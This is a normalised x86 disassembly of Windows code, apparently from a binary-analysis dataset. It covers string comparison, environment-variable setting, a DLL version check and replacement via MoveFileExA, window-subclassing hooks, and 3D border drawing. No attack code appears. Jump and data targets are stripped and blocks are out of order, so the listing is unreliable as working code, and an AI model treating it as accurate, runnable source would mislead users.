push 0x9
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
cmp esi edi
jg r-xdata
mov eax edi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
add eax eax
add eax 0x3
and al 0xfc
call sub_42f0a0
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x3
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
push [ ebp + 0x20 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
pop eax
jmp r-xdata
cmp esi ebx
jle r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov esi [ MultiByteToWideChar@IAT ]
call esi
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
push ebx
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x9
push [ ebp + 0x20 ]
call esi
mov esi eax
mov [ ebp - 0x20 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_42f0a0
mov [ ebp - 0x18 ] esp
mov edi esp
mov [ ebp - 0x28 ] edi
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
cmp edi ebx
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
mov ecx [ ebp + 0x10 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
push esi
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
push esi
push edi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
jmp r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
sub_437235
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_437260
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
push 0x3d
push [ ebp + 0x8 ]
call sub_42e6a3
mov esi eax
pop ecx
cmp esi edi
pop ecx
mov [ ebp - 0x8 ] esi
je r-xdata
cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp [ esi + 0x1 ] bl
sete bl
cmp eax [ rw-data ]
jne r-xdata
cmp eax edi
jne r-xdata
push eax
call sub_43743f
pop ecx
mov [ rw-data ] eax
sub esi [ ebp + 0x8 ]
mov edi [ rw-data ]
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x8 ]
call sub_4373e7
mov esi eax
pop ecx
test esi esi
pop ecx
jl r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
test ebx ebx
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp ebx edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
xor eax eax
jmp r-xdata
test esi esi
jge r-xdata
test ebx ebx
je r-xdata
push 0x4
call sub_42dd9c
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
call sub_436cae
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi * 4 + 0x8 ]
push eax
push edi
call sub_42fe37
pop ecx
test eax eax
pop ecx
je r-xdata
neg esi
mov eax [ ebp + 0x8 ]
mov [ edi + esi * 4 ] eax
jmp r-xdata
push [ edi + esi * 4 ]
lea edi [ edi + esi * 4 ]
call sub_42ded6
pop ecx
mov [ eax ] edi
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + esi * 4 ] ecx
and [ eax + esi * 4 + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax esi
shl eax 0x2
push eax
push [ ebp - 0x4 ]
call sub_42fe37
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ edi + 0x4 ]
inc esi
mov [ edi ] eax
add edi 0x4
jmp r-xdata
push 0x4
call sub_42dd9c
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
push [ ebp + 0x8 ]
call sub_42eea0
inc eax
inc eax
push eax
call sub_42dd9c
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov [ eax ] edi
push [ ebp + 0x8 ]
push esi
call sub_4350c0
mov eax esi
pop ecx
sub eax [ ebp + 0x8 ]
pop ecx
add eax [ ebp - 0x8 ]
and [ eax ] 0x0
inc eax
neg ebx
sbb ebx ebx
not ebx
and ebx eax
push ebx
push esi
call [ SetEnvironmentVariableA@IAT ]
push esi
call sub_42ded6
pop ecx
mov [ rw-data ] eax
sub_4373e7
push esi
mov esi [ rw-data ]
push edi
mov eax [ esi ]
test eax eax
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
add esi 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi ]
cmp al 0x3d
je r-xdata
push edi
push eax
push [ esp + 0x14 ]
call sub_436c6f
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop edi
pop esi
retn
sub_43743f
push edi
mov edi [ esp + 0x8 ]
xor ecx ecx
test edi edi
jne r-xdata
cmp [ edi ] 0x0
lea eax [ edi + 0x4 ]
je r-xdata
xor eax eax
pop edi
retn
push ebx
push ebp
lea eax [ ecx * 4 + 0x4 ]
push esi
push eax
call sub_42dd9c
mov esi eax
pop ecx
test esi esi
mov ebp esi
jne r-xdata
mov edx [ eax ]
inc ecx
add eax 0x4
test edx edx
jne r-xdata
mov eax [ edi ]
mov ebx edi
push 0x9
call sub_42dba0
pop ecx
and [ esi ] 0x0
mov eax ebp
pop esi
pop ebp
pop ebx
pop edi
retn
push eax
add ebx 0x4
call sub_42f9ae
mov [ esi ] eax
mov eax [ ebx ]
pop ecx
add esi 0x4
jmp r-xdata
test eax eax
je r-xdata
sub_4375a2
push rw-data
call sub_4375ca
test eax eax
pop ecx
je r-xdata
xor eax eax
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call eax
jmp r-xdata
retn 0x10
sub_4375ca
push ebp
mov ebp esp
sub esp 0x524
mov eax [ rw-data ]
push esi
test eax eax
push edi
jne r-xdata
push [ ebp + 0x8 ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
mov [ ebp - 0x4 ] eax
jne r-xdata
call sub_437685
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ GetModuleFileNameA@IAT ]
mov edi 0x105
lea eax [ ebp - 0x10c ]
push edi
push eax
push [ rw-data ]
call esi
push 0x0
call [ GetModuleHandleW@IAT ]
lea ecx [ ebp - 0x214 ]
push edi
push ecx
push eax
call esi
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp - 0x214 ]
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x524 ]
push rw-data
push eax
call [ wsprintfA@IAT ]
add esp 0x14
lea eax [ ebp - 0x524 ]
push 0x40
push rw-data
push eax
push 0x0
call [ MessageBoxA@IAT ]
push 0x40
push rw-data
push rw-data
push eax
call [ MessageBoxA@IAT ]
xor eax eax
jmp r-xdata
pop edi
pop esi
leave
retn
sub_437685
push ebp
mov ebp esp
sub esp 0x664
push ebx
push esi
push edi
lea eax [ ebp - 0x354 ]
xor edi edi
push 0x105
push eax
mov [ ebp - 0x4 ] edi
call [ GetSystemDirectoryA@IAT ]
push [ rw-data ]
mov esi [ wsprintfA@IAT ]
lea eax [ ebp - 0x354 ]
push eax
lea eax [ ebp - 0x24c ]
push rw-data
push eax
call esi
add esp 0x10
lea eax [ ebp - 0x24c ]
push edi
push 0x10000080
push 0x3
push edi
push 0x3
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov edi [ FreeLibrary@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
push [ rw-data ]
mov esi [ LoadLibraryA@IAT ]
call esi
mov ebx eax
lea eax [ ebp - 0x24c ]
push eax
mov [ ebp - 0x14 ] ebx
call esi
mov esi eax
test esi esi
mov [ ebp - 0x18 ] esi
je r-xdata
push 0x0
push ebx
call [ GetFileSize@IAT ]
push ebx
mov [ ebp - 0x8 ] eax
call [ CloseHandle@IAT ]
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov eax esi
or eax ebx
test ebx ebx
je r-xdata
cmp [ ebp - 0x8 ] 0x4e20
jae r-xdata
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_437940
add esp 0xc
mov ebx eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x24c ]
push eax
call [ ebp - 0x20 ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] ebx
push esi
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_437940
add esp 0xc
mov [ ebp - 0x38 ] eax
test eax eax
jne r-xdata
push ebx
call edi
lea eax [ ebp - 0x354 ]
push eax
lea eax [ ebp - 0x458 ]
push rw-data
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x458 ]
push 0x3
push eax
lea eax [ ebp - 0x24c ]
push eax
call [ MoveFileExA@IAT ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x664 ]
push 0x20a
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x24c ]
push eax
call [ ebp - 0x2c ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x664 ]
push eax
call [ ebp - 0x2c ]
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x34 ] eax
je r-xdata
push esi
call edi
mov eax ebx
jmp r-xdata
push esi
mov [ ebp - 0x4 ] ebx
call edi
test eax eax
je r-xdata
call edi
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0xc ]
mov esi [ LocalAlloc@IAT ]
push 0x0
call esi
push [ ebp - 0x34 ]
mov [ ebp - 0x10 ] eax
push 0x0
call esi
push [ ebp - 0x10 ]
mov esi [ LocalLock@IAT ]
mov [ ebp - 0x1c ] eax
call esi
push [ ebp - 0x1c ]
mov ebx eax
call esi
xor esi esi
mov [ ebp - 0x8 ] eax
cmp ebx esi
je r-xdata
mov eax [ ebp - 0x14 ]
push [ ebp - 0x18 ]
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push [ ebp - 0x10 ]
call esi
push [ ebp - 0x10 ]
call ebx
push ebx
lea eax [ ebp - 0x664 ]
push [ ebp - 0xc ]
push esi
push eax
call [ ebp - 0x24 ]
test eax eax
je r-xdata
push [ ebp - 0x38 ]
jmp r-xdata
push [ ebp - 0x1c ]
call esi
push [ ebp - 0x1c ]
call ebx
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x24c ]
push [ ebp - 0x34 ]
push esi
push eax
call [ ebp - 0x24 ]
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
mov esi r--data
push eax
lea eax [ ebp - 0x30 ]
push eax
push esi
push ebx
call [ ebp - 0x20 ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push esi
push [ ebp - 0x8 ]
call [ ebp - 0x20 ]
push [ ebp - 0x28 ]
push [ ebp - 0x30 ]
call sub_437912
pop ecx
cmp al 0x3c
pop ecx
je r-xdata
mov eax [ ebp - 0x18 ]
push [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
jle r-xdata
call edi
cmp [ ebp - 0x10 ] 0x0
mov esi [ LocalUnlock@IAT ]
mov ebx [ LocalFree@IAT ]
je r-xdata
cmp al 0x3e
jg r-xdata
sub_437912
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push esi
mov edx [ eax + 0x8 ]
mov esi [ ecx + 0x8 ]
cmp edx esi
ja r-xdata
mov al 0x3e
pop esi
retn
jae r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ecx + 0xc ]
cmp eax ecx
jbe r-xdata
mov al 0x3c
pop esi
retn
sbb al al
pop esi
add eax 0x3d
retn
sub_437940
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov ebx eax
test ebx ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ GetProcAddress@IAT ]
push rw-data
push ebx
call esi
mov edi [ ebp + 0x8 ]
push rw-data
push ebx
mov [ edi ] eax
call esi
mov ebx [ ebp + 0xc ]
push rw-data
push [ ebp - 0x4 ]
mov [ ebx ] eax
call esi
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
xor eax eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax eax
jne r-xdata
sub_4379d0
push esi
push edi
mov esi [ esp + 0xc ]
push esi
call sub_4379b0
add esp 0x4
mov edi eax
test edi edi
jne r-xdata
mov eax edi
pop edi
pop esi
retn
mov eax [ esp + 0x10 ]
cmp eax 0x6
jne r-xdata
lea eax [ eax + eax * 2 ]
mov edi [ eax * 8 + rw-data ]
mov edi [ rw-data ]
jmp r-xdata
push edi
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call [ SetPropA@IAT ]
sub_437a20
sub esp 0x10
xor eax eax
mov ax [ rw-data ]
push esi
mov esi [ esp + 0x18 ]
push edi
push eax
mov edi [ GetPropA@IAT ]
push esi
call edi
test eax eax
jne r-xdata
pop edi
pop esi
add esp 0x10
retn
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
push esi
call sub_4379b0
add esp 0x4
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x20 ]
push eax
push 0xfffffffc
push esi
call [ SetWindowLongA@IAT ]
push eax
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call [ SetPropA@IAT ]
push esi
call [ IsWindowUnicode@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x8 ]
push 0x10
push eax
push esi
call [ GetClassNameA@IAT ]
lea ecx [ esp + 0x8 ]
push rw-data
push ecx
call [ lstrcmpiA@IAT ]
test eax eax
sub_437b10
mov eax [ esp + 0x8 ]
sub esp 0x4
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x14 ]
push edi
push esi
mov edx [ rw-data ]
push eax
push ecx
push edx
call [ CallNextHookEx@IAT ]
mov edi eax
mov ecx [ rw-data ]
cmp [ esi + 0xc ] ecx
jne r-xdata
mov eax edi
pop edi
pop esi
add esp 0x4
retn 0xc
mov eax [ rw-data ]
push eax
call [ UnhookWindowsHookEx@IAT ]
cmp [ rw-data ] 0x35f
jb r-xdata
mov [ esp + 0x8 ] 0x1
push 0xfffffff0
mov eax [ esi + 0xc ]
push eax
call [ GetWindowLongA@IAT ]
mov [ esp + 0x8 ] 0x0
test al 0x4
jne r-xdata
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax [ rw-data ]
mov ecx [ esi + 0xc ]
push eax
push ecx
call sub_437a20
add esp 0x8
lea eax [ esp + 0x8 ]
mov ecx [ esi + 0xc ]
push eax
push 0x0
push 0x11f0
push ecx
call [ SendMessageA@IAT ]
cmp [ esp + 0x8 ] 0x0
je r-xdata
sub_437bc0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov [ rw-data ] eax
mov [ rw-data ] ecx
call [ GetCurrentThreadId@IAT ]
push eax
mov ecx [ rw-data ]
push ecx
push sub_437b10
push 0x4
call [ SetWindowsHookExA@IAT ]
mov [ rw-data ] eax
retn
sub_437c00
mov eax [ esp + 0x14 ]
push ebx
push esi
push edi
mov esi [ esp + 0x10 ]
push eax
push esi
call sub_4379d0
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
add esp 0x8
push ecx
push edx
push ebx
push esi
push eax
call [ CallWindowProcA@IAT ]
mov edi eax
mov ebx [ RemovePropA@IAT ]
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call ebx
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call ebx
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_437c80
push esi
mov esi rw-data
push esi
call sub_437c60
add esp 0x4
add esi 0x4
cmp esi rw-data
jb r-xdata
push rw-data
call sub_437c60
add esp 0x4
pop esi
retn
sub_437cb0
mov eax [ esp + 0x8 ]
push esi
push 0xf00021
mov esi [ eax + 0x4 ]
mov edx [ eax ]
mov ecx [ eax + 0xc ]
sub ecx esi
mov eax [ eax + 0x8 ]
push ecx
sub eax edx
mov ecx [ esp + 0x10 ]
push eax
push esi
push edx
push ecx
call [ PatBlt@IAT ]
pop esi
retn
sub_437ce0
mov eax [ esp + 0xc ]
sub esp 0x10
and eax 0xffff
push ebx
push esi
push edi
push ebp
mov ecx [ eax * 4 + rw-data ]
mov edi [ esp + 0x24 ]
push ecx
push edi
call [ SetBkColor@IAT ]
mov esi eax
mov ebx [ esp + 0x28 ]
lea ecx [ esp + 0x10 ]
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
mov ebp [ ebx + 0x8 ]
mov [ ecx ] eax
mov eax [ ebx + 0xc ]
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x8 ] ebp
mov bp [ esp + 0x34 ]
mov [ ecx + 0xc ] eax
mov eax [ esp + 0x14 ]
inc eax
test bp 0x2
mov [ esp + 0x1c ] eax
je r-xdata
mov eax [ ebx + 0xc ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x10 ]
inc eax
test bp 0x1
mov [ esp + 0x18 ] eax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x2
push 0x0
push 0x0
push edi
call [ ExtTextOutA@IAT ]
mov ax [ esp + 0x30 ]
cmp [ esp + 0x2c ] ax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x2
push 0x0
push 0x0
push edi
call [ ExtTextOutA@IAT ]
mov eax [ ebx + 0x8 ]
mov [ esp + 0x18 ] eax
dec eax
test bp 0x4
mov [ esp + 0x10 ] eax
je r-xdata
movzx eax ax
mov ecx [ eax * 4 + rw-data ]
push ecx
push edi
call [ SetBkColor@IAT ]
test bp 0x8
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x2
push 0x0
push 0x0
push edi
call [ ExtTextOutA@IAT ]
push esi
push edi
call [ SetBkColor@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x10
retn
mov eax [ ebx ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x1c ]
dec eax
test bp 0x1000
mov [ esp + 0x14 ] eax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x2
push 0x0
push 0x0
push edi
call [ ExtTextOutA@IAT ]
sub [ esp + 0x18 ] 0x2
sub_437e20
mov ecx [ esp + 0x8 ]
sub esp 0x10
lea edx [ esp ]
push esi
push edi
mov eax [ ecx ]
mov esi [ ecx + 0x4 ]
mov edi [ ecx + 0x8 ]
mov [ edx ] eax
mov eax [ ecx + 0xc ]
mov [ edx + 0x4 ] esi
mov [ edx + 0x8 ] edi
mov di [ esp + 0x24 ]
mov [ edx + 0xc ] eax
mov ax di
lea edx [ esp + 0x8 ]
and ax 0xf
mov esi [ esp + 0x1c ]
push eax
push 0x1
push 0x7
push edx
push esi
call sub_437ce0
dec [ esp + 0x1c ]
dec [ esp + 0x20 ]
lea ecx [ esp + 0x1c ]
inc [ esp + 0x24 ]
inc [ esp + 0x28 ]
add esp 0x14
push edi
push 0x0
push 0x2
push ecx
push esi
call sub_437ce0
add esp 0x14
pop edi
pop esi
add esp 0x10
retn
sub_437e90
mov ecx [ esp + 0x4 ]
sub esp 0x10
lea eax [ esp ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
push ecx
mov ecx [ esp + 0x4 ]
push edx
mov edx [ esp + 0x20 ]
push eax
push ecx
push edx
call [ IntersectClipRect@IAT ]
add esp 0x10
retn
sub_437ed0
mov eax [ esp + 0x8 ]
sub esp 0x108
push ebx
cmp [ eax ] 0x0
push esi
push edi
lea esi [ esp + 0x14 ]
je r-xdata
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x14 ]
push eax
mov [ esi ] 0x0
push ecx
call [ lstrlenA@IAT ]
lea ecx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x120 ]
push ecx
push eax
call [ GetTextExtentPointA@IAT ]
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x120 ]
mov edx [ esp + 0x10 ]
mov [ eax ] ecx
mov ecx [ esp + 0x124 ]
pop edi
pop esi
pop ebx
mov [ ecx ] edx
add esp 0x108
retn
mov edi [ CharNextA@IAT ]
xor ebx ebx
cmp [ rw-data ] bl
je r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
mov cl [ eax ]
inc eax
mov [ esi ] cl
inc esi
cmp cl [ rw-data ]
jne r-xdata
jmp r-xdata
mov cl [ eax ]
cmp cl 0x26
jne r-xdata
cmp cl 0x1e
je r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
inc eax
cmp [ eax ] bl
je r-xdata
cmp cl 0x1f
jne r-xdata
jmp r-xdata
push eax
call edi
jmp r-xdata
cmp [ eax ] bl
jne r-xdata
sub_437f80
push esi
push rw-data
call [ InitializeCriticalSection@IAT ]
push rw-data
call [ EnterCriticalSection@IAT ]
push rw-data
inc [ rw-data ]
call [ LeaveCriticalSection@IAT ]
cmp [ rw-data ] 0x1
jne r-xdata
mov esi [ esp + 0x8 ]
mov esi [ esp + 0x8 ]
push 0x0
push 0x1
push esi
call sub_43ae80
add esp 0xc
call sub_438a50
jmp r-xdata
mov eax [ rw-data ]
pop esi
retn 0x4
push esi
call sub_4380b0
call sub_438200
test eax eax
je r-xdata
sub_437ff0
push ebx
push esi
push edi
push ebp
xor ebp ebp
call [ GetCurrentThreadId@IAT ]
mov ebx eax
push rw-data
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] ebp
jle r-xdata
push rw-data
dec [ rw-data ]
call [ LeaveCriticalSection@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp * 4 ]
cmp [ eax + eax * 4 + rw-data ] ebx
lea esi [ eax + eax * 4 ]
jne r-xdata
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
call sub_438c40
inc ebp
cmp ebp [ rw-data ]
jl r-xdata
mov eax [ esi + rw-data ]
dec eax
mov [ esi + rw-data ] eax
je r-xdata
mov eax [ esi + rw-data ]
push eax
call [ UnhookWindowsHookEx@IAT ]
dec [ rw-data ]
cmp ebp [ rw-data ]
jge r-xdata
mov eax [ esp + 0x14 ]
cmp [ esi + rw-data ] eax
jne r-xdata
lea edi [ esi + rw-data ]
lea eax [ edi + 0x14 ]
mov ecx 0x5
mov esi eax
inc ebp
[ edi ] [ esi ]
mov edi eax
cmp ebp [ rw-data ]
jl r-xdata
sub_4380c0
cmp [ rw-data ] 0x30a
push esi
push edi
jae r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edi
pop esi
retn 0x8
mov esi [ esp + 0x10 ]
or esi 0x1
test esi 0x2
je r-xdata
xor eax eax
pop edi
pop esi
retn 0x8
push rw-data
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] 0x80
je r-xdata
and esi 0xfffffffc
push rw-data
call [ LeaveCriticalSection@IAT ]
xor eax eax
pop edi
pop esi
retn 0x8
call [ GetCurrentThreadId@IAT ]
mov edi eax
xor eax eax
cmp [ rw-data ] eax
jle r-xdata
push edi
mov eax [ rw-data ]
push eax
push sub_439220
push 0x5
call [ SetWindowsHookExA@IAT ]
test eax eax
je r-xdata
mov ecx rw-data
mov edx [ rw-data ]
mov ecx [ esp + 0xc ]
shl edx 0x2
mov [ edx + edx * 4 + rw-data ] ecx
mov ecx [ rw-data ]
shl ecx 0x2
mov [ ecx + ecx * 4 + rw-data ] edi
mov ecx [ rw-data ]
shl ecx 0x2
mov [ ecx + ecx * 4 + rw-data ] eax
mov eax [ rw-data ]
shl eax 0x2
mov [ eax + eax * 4 + rw-data ] 0x1
mov eax [ rw-data ]
shl eax 0x2
mov [ eax + eax * 4 + rw-data ] esi
mov ecx [ rw-data ]
mov [ rw-data ] edi
mov [ rw-data ] ecx
inc [ rw-data ]
shl eax 0x2
inc [ eax + eax * 4 + rw-data ]
jmp r-xdata
add ecx 0x14
inc eax
cmp eax [ rw-data ]
jl r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax 0x1
pop edi
pop esi
retn 0x8
cmp [ ecx ] edi
je r-xdata
sub_438200
call [ GetCurrentThreadId@IAT ]
xor edx edx
cmp [ rw-data ] edx
jle r-xdata
xor eax eax
retn
mov ecx rw-data
mov eax 0x1
retn
add ecx 0x14
inc edx
cmp edx [ rw-data ]
jl r-xdata
cmp [ ecx ] eax
je r-xdata
sub_438230
push ebx
push esi
push edi
push ebp
xor ebp ebp
call [ GetCurrentThreadId@IAT ]
mov ebx eax
push rw-data
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] ebp
jle r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp * 4 ]
cmp [ eax + eax * 4 + rw-data ] ebx
lea esi [ eax + eax * 4 ]
jne r-xdata
inc ebp
cmp ebp [ rw-data ]
jl r-xdata
mov eax [ esi + rw-data ]
dec eax
mov [ esi + rw-data ] eax
jne r-xdata
mov eax [ esi + rw-data ]
push eax
call [ UnhookWindowsHookEx@IAT ]
dec [ rw-data ]
cmp ebp [ rw-data ]
jge r-xdata
lea edi [ esi + rw-data ]
lea eax [ edi + 0x14 ]
mov ecx 0x5
mov esi eax
inc ebp
[ edi ] [ esi ]
mov edi eax
cmp ebp [ rw-data ]
jl r-xdata
sub_438300
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
push ebp
jne r-xdata
mov esi [ esp + 0x14 ]
push 0xfffffffc
push esi
call [ GetWindowLongA@IAT ]
xor ecx ecx
mov edi [ SetWindowLongA@IAT ]
mov ebx [ RemovePropA@IAT ]
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
inc ecx
cmp ecx 0x6
jl r-xdata
push ecx
push esi
call sub_4379d0
add esp 0x8
mov ebp eax
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call ebx
push ebp
push 0xfffffffc
push esi
call edi
xor eax eax
mov ecx 0x10
lea edx [ ecx + ecx * 2 ]
cmp [ edx * 8 + rw-data ] eax
jne r-xdata
jne r-xdata
push 0x5
push esi
mov esi [ GetWindow@IAT ]
call esi
mov edi eax
test edi edi
je r-xdata
cmp eax sub_438eb0
jne r-xdata
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
push edi
call sub_438300
push 0x2
push edi
call esi
mov edi eax
test edi edi
jne r-xdata
xor eax eax
mov edi [ GetPropA@IAT ]
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
push ecx
push esi
call sub_4379d0
add esp 0x8
mov ebp eax
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call ebx
push ebp
push 0xfffffffc
push esi
call edi
jmp r-xdata
push 0x1
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call [ SetPropA@IAT ]
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
